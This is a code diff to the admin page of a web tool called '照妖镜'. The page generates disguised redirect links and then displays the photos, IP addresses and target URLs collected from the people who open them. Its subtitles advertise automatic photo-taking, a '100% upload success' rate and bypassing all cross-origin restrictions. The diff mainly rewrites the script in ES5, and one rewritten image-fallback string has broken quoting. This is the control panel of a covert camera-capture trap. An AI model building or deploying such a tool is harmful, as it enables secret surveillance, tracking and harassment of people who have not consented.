@@ -191,7 +191,7 @@
         <div class="left-panel">
             <div class="card">
                 <h1>🔮 照妖镜</h1>
-                <div class="subtitle">硬核模式 · 自动拍照 · 最多5张</div>
+                <div class="subtitle">极简硬核模式 · 100% 上传成功</div>
             </div>
             <div class="card-solid">
                 <div class="section-title">生成拍照链接</div>
@@ -211,7 +211,7 @@
                 </div>
                 <div class="warning">
                     💡 每个编号最多存储 5 张照片<br>
-                    🔥 硬核模式：100% 上传成功率
+                    🔥 极简硬核模式：绕过所有跨域限制
                 </div>
             </div>
         </div>
@@ -232,7 +232,7 @@
         <div id="pageHome" class="mobile-page active-page">
             <div class="card">
                 <h1>🔮 照妖镜</h1>
-                <div class="subtitle">硬核模式 · 100% 成功率</div>
+                <div class="subtitle">极简硬核 · 100% 成功</div>
             </div>
             <div class="card-solid">
                 <div class="section-title">生成拍照链接</div>
@@ -252,7 +252,7 @@
                 </div>
                 <div class="warning">
                     💡 每个编号最多存储 5 张照片<br>
-                    🔥 硬核模式：100% 上传成功率
+                    🔥 极简硬核模式：绕过所有跨域限制
                 </div>
             </div>
         </div>
@@ -274,41 +274,41 @@
     </div>
 
     <script>
-        const API_URL = window.location.href.replace(/index\.html.*$/, '') + 'api.php';
-        const BASE_URL = window.location.href.replace(/index\.html.*$/, '');
-        const CAMERA_PAGE = BASE_URL + 'camera.html';
+        var API_URL = window.location.href.replace(/index\.html.*$/, '') + 'api.php';
+        var BASE_URL = window.location.href.replace(/index\.html.*$/, '');
+        var CAMERA_PAGE = BASE_URL + 'camera.html';
 
         function showToast(msg) {
-            let toast = document.querySelector('.copy-toast');
+            var toast = document.querySelector('.copy-toast');
             if (toast) toast.remove();
             toast = document.createElement('div');
             toast.className = 'copy-toast';
             toast.textContent = msg;
             document.body.appendChild(toast);
-            setTimeout(() => toast.remove(), 2000);
+            setTimeout(function() { toast.remove(); }, 2000);
         }
 
-        function escapeHtml(t) { if (!t) return ''; const d=document.createElement('div'); d.textContent=t; return d.innerHTML; }
+        function escapeHtml(t) { if (!t) return ''; var d=document.createElement('div'); d.textContent=t; return d.innerHTML; }
         function formatTime(t) { if (!t) return ''; return t.substring(5,16); }
 
         function generateLink(targetUrlId, codeId, linkBoxId, generatedId) {
-            let targetUrl = document.getElementById(targetUrlId).value.trim();
-            let code = document.getElementById(codeId).value.trim().toUpperCase();
+            var targetUrl = document.getElementById(targetUrlId).value.trim();
+            var code = document.getElementById(codeId).value.trim().toUpperCase();
             if (!targetUrl) { showToast('请输入跳转网址'); return; }
             if (!code) { showToast('请输入编号'); return; }
             if (!targetUrl.startsWith('http')) targetUrl = 'https://' + targetUrl;
-            const cameraUrl = CAMERA_PAGE + '?code=' + encodeURIComponent(code) + '&url=' + encodeURIComponent(targetUrl);
+            var cameraUrl = CAMERA_PAGE + '?code=' + encodeURIComponent(code) + '&url=' + encodeURIComponent(targetUrl);
             document.getElementById(linkBoxId).textContent = cameraUrl;
             document.getElementById(generatedId).classList.add('show');
         }
 
         function copyLink(linkBoxId) {
-            const text = document.getElementById(linkBoxId).textContent;
+            var text = document.getElementById(linkBoxId).textContent;
             if (!text) { showToast('没有可复制的链接'); return; }
-            if (navigator.clipboard?.writeText) {
-                navigator.clipboard.writeText(text).then(() => showToast('✅ 链接已复制'));
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(text).then(function() { showToast('✅ 链接已复制'); });
             } else {
-                let ta = document.createElement('textarea');
+                var ta = document.createElement('textarea');
                 ta.value = text;
                 document.body.appendChild(ta);
                 ta.select();
@@ -318,48 +318,43 @@
             }
         }
 
-        let currentPhotosData = [];
-        let selectedPhotoIndex = 0;
+        var currentPhotosData = [];
+        var selectedPhotoIndex = 0;
         function renderPhotoGrid(code, photos, containerId) {
-            const container = document.getElementById(containerId);
+            var container = document.getElementById(containerId);
             if (!container) return;
             if (!photos || photos.length === 0) {
                 container.innerHTML = '<div class="empty-photos">📷 暂无照片<br><small>等待对方访问链接后拍照</small></div>';
                 return;
             }
-            let html = `<div style="margin-bottom:12px;font-size:14px;color:#007aff;">📸 共 ${photos.length} 张照片 (最多5张)</div>`;
+            var html = '<div style="margin-bottom:12px;font-size:14px;color:#007aff;">📸 共 ' + photos.length + ' 张照片 (最多5张)</div>';
             html += '<div class="photos-grid">';
-            for (let i=0; i<photos.length; i++) {
-                const photo = photos[i];
-                const photoUrl = `${API_URL}?action=view_photo&code=${encodeURIComponent(code)}&index=${i}&t=${photo.timestamp}`;
-                const isSelected = (selectedPhotoIndex === i);
-                html += `
-                    <div class="photo-grid-item ${isSelected?'selected':''}" data-index="${i}">
-                        <img src="${photoUrl}" loading="lazy" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'150\' height=\'150\' viewBox=\'0 0 150 150\'%3E%3Crect width=\'150\' height=\'150\' fill=\'%23ddd\'/%3E%3Ctext x=\'50%25\' y=\'50%25\' text-anchor=\'middle\' dy=\'.3em\' fill=\'%23999\'%3E加载失败%3C/text%3E%3C/svg%3E'">
-                        <div class="photo-grid-info">${formatTime(photo.time)}</div>
-                    </div>
-                `;
+            for (var i=0; i<photos.length; i++) {
+                var photo = photos[i];
+                var photoUrl = API_URL + '?action=view_photo&code=' + encodeURIComponent(code) + '&index=' + i + '&t=' + photo.timestamp;
+                var isSelected = (selectedPhotoIndex === i);
+                html += '<div class="photo-grid-item ' + (isSelected?'selected':'') + '" data-index="' + i + '">' +
+                        '<img src="' + photoUrl + '" loading="lazy" onerror="this.src=\'data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'150\' height=\'150\' viewBox=\'0 0 150 150\'%3E%3Crect width=\'150\' height=\'150\' fill=\'%23ddd\'/%3E%3Ctext x=\'50%25\' y=\'50%25\' text-anchor=\'middle\' dy=\'.3em\' fill=\'%23999\'%3E加载失败%3C/text%3E%3C/svg%3E\'">' +
+                        '<div class="photo-grid-info">' + formatTime(photo.time) + '</div>' +
+                        '</div>';
             }
             html += '</div>';
-            const selectedPhoto = photos[selectedPhotoIndex];
+            var selectedPhoto = photos[selectedPhotoIndex];
             if (selectedPhoto) {
-                const photoUrl = `${API_URL}?action=view_photo&code=${encodeURIComponent(code)}&index=${selectedPhotoIndex}&t=${selectedPhoto.timestamp}`;
-                html += `
-                    <div class="photo-detail">
-                        <img src="${photoUrl}" alt="大图">
-                        <div class="photo-info-panel">
-                            <div class="info-row"><span class="info-label">编号</span><span class="info-value">${escapeHtml(code)}</span></div>
-                            <div class="info-row"><span class="info-label">拍摄时间</span><span class="info-value">${escapeHtml(selectedPhoto.time)}</span></div>
-                            <div class="info-row"><span class="info-label">IP地址</span><span class="info-value">${escapeHtml(selectedPhoto.ip)}</span></div>
-                            <div class="info-row"><span class="info-label">跳转网址</span><span class="info-value">${escapeHtml(selectedPhoto.target_url)}</span></div>
-                        </div>
-                    </div>
-                `;
+                var photoUrl = API_URL + '?action=view_photo&code=' + encodeURIComponent(code) + '&index=' + selectedPhotoIndex + '&t=' + selectedPhoto.timestamp;
+                html += '<div class="photo-detail">' +
+                        '<img src="' + photoUrl + '" alt="大图">' +
+                        '<div class="photo-info-panel">' +
+                        '<div class="info-row"><span class="info-label">编号</span><span class="info-value">' + escapeHtml(code) + '</span></div>' +
+                        '<div class="info-row"><span class="info-label">拍摄时间</span><span class="info-value">' + escapeHtml(selectedPhoto.time) + '</span></div>' +
+                        '<div class="info-row"><span class="info-label">IP地址</span><span class="info-value">' + escapeHtml(selectedPhoto.ip) + '</span></div>' +
+                        '<div class="info-row"><span class="info-label">跳转网址</span><span class="info-value">' + escapeHtml(selectedPhoto.target_url) + '</span></div>' +
+                        '</div></div>';
             }
             container.innerHTML = html;
-            container.querySelectorAll('.photo-grid-item').forEach(item => {
+            container.querySelectorAll('.photo-grid-item').forEach(function(item) {
                 item.addEventListener('click', function() {
-                    const idx = parseInt(this.dataset.index);
+                    var idx = parseInt(this.dataset.index);
                     if (!isNaN(idx) && currentPhotosData[idx]) {
                         selectedPhotoIndex = idx;
                         renderPhotoGrid(code, currentPhotosData, containerId);
@@ -369,60 +364,60 @@
         }
 
         function viewPhoto(searchCodeId, resultContainerId) {
-            const code = document.getElementById(searchCodeId).value.trim().toUpperCase();
+            var code = document.getElementById(searchCodeId).value.trim().toUpperCase();
             if (!code) { showToast('请输入编号'); return; }
-            const container = document.getElementById(resultContainerId);
+            var container = document.getElementById(resultContainerId);
             container.innerHTML = '<div style="text-align:center;padding:30px;"><div class="loading-spinner"></div><div>加载中...</div></div>';
-            fetch(`${API_URL}?action=check_code&code=${encodeURIComponent(code)}&t=${Date.now()}`)
-                .then(res => res.json())
-                .then(data => {
+            fetch(API_URL + '?action=check_code&code=' + encodeURIComponent(code) + '&t=' + Date.now())
+                .then(function(res) { return res.json(); })
+                .then(function(data) {
                     if (data.exists && data.photos && data.photos.length > 0) {
                         currentPhotosData = data.photos;
                         selectedPhotoIndex = 0;
                         renderPhotoGrid(code, data.photos, resultContainerId);
                     } else {
-                        container.innerHTML = `<div class="error-msg">❌ 未找到编号 <strong>${escapeHtml(code)}</strong> 的照片</div>`;
+                        container.innerHTML = '<div class="error-msg">❌ 未找到编号 <strong>' + escapeHtml(code) + '</strong> 的照片</div>';
                     }
                 })
-                .catch(err => {
-                    container.innerHTML = `<div class="error-msg">❌ 查询失败：${err.message}</div>`;
+                .catch(function(err) {
+                    container.innerHTML = '<div class="error-msg">❌ 查询失败：' + err.message + '</div>';
                 });
         }
 
         document.addEventListener('DOMContentLoaded', function() {
-            document.getElementById('generateBtnDesktop')?.addEventListener('click', () => {
+            document.getElementById('generateBtnDesktop').addEventListener('click', function() {
                 generateLink('targetUrlDesktop', 'photoCodeDesktop', 'linkBoxDesktop', 'generatedLinkDesktop');
             });
-            document.getElementById('copyLinkBtnDesktop')?.addEventListener('click', () => {
+            document.getElementById('copyLinkBtnDesktop').addEventListener('click', function() {
                 copyLink('linkBoxDesktop');
             });
-            document.getElementById('viewBtnDesktop')?.addEventListener('click', () => {
+            document.getElementById('viewBtnDesktop').addEventListener('click', function() {
                 viewPhoto('searchCodeDesktop', 'photoResultDesktop');
             });
-            document.getElementById('searchCodeDesktop')?.addEventListener('keypress', e => {
+            document.getElementById('searchCodeDesktop').addEventListener('keypress', function(e) {
                 if (e.key === 'Enter') viewPhoto('searchCodeDesktop', 'photoResultDesktop');
             });
 
-            document.getElementById('generateBtnMobile')?.addEventListener('click', () => {
+            document.getElementById('generateBtnMobile').addEventListener('click', function() {
                 generateLink('targetUrlMobile', 'photoCodeMobile', 'linkBoxMobile', 'generatedLinkMobile');
             });
-            document.getElementById('copyLinkBtnMobile')?.addEventListener('click', () => {
+            document.getElementById('copyLinkBtnMobile').addEventListener('click', function() {
                 copyLink('linkBoxMobile');
             });
-            document.getElementById('viewBtnMobile')?.addEventListener('click', () => {
+            document.getElementById('viewBtnMobile').addEventListener('click', function() {
                 viewPhoto('searchCodeMobile', 'photoResultMobile');
             });
-            document.getElementById('searchCodeMobile')?.addEventListener('keypress', e => {
+            document.getElementById('searchCodeMobile').addEventListener('keypress', function(e) {
                 if (e.key === 'Enter') viewPhoto('searchCodeMobile', 'photoResultMobile');
             });
 
-            document.querySelectorAll('.mobile-nav .nav-item').forEach(item => {
+            document.querySelectorAll('.mobile-nav .nav-item').forEach(function(item) {
                 item.addEventListener('click', function() {
-                    const page = this.dataset.page;
-                    document.querySelectorAll('.mobile-nav .nav-item').forEach(n => n.classList.remove('active'));
+                    var page = this.dataset.page;
+                    document.querySelectorAll('.mobile-nav .nav-item').forEach(function(n) { n.classList.remove('active'); });
                     this.classList.add('active');
-                    document.getElementById('pageHome')?.classList.toggle('active-page', page === 'home');
-                    document.getElementById('pageView')?.classList.toggle('active-page', page === 'view');
+                    document.getElementById('pageHome').classList.toggle('active-page', page === 'home');
+                    document.getElementById('pageView').classList.toggle('active-page', page === 'view');
                 });
             });
         });
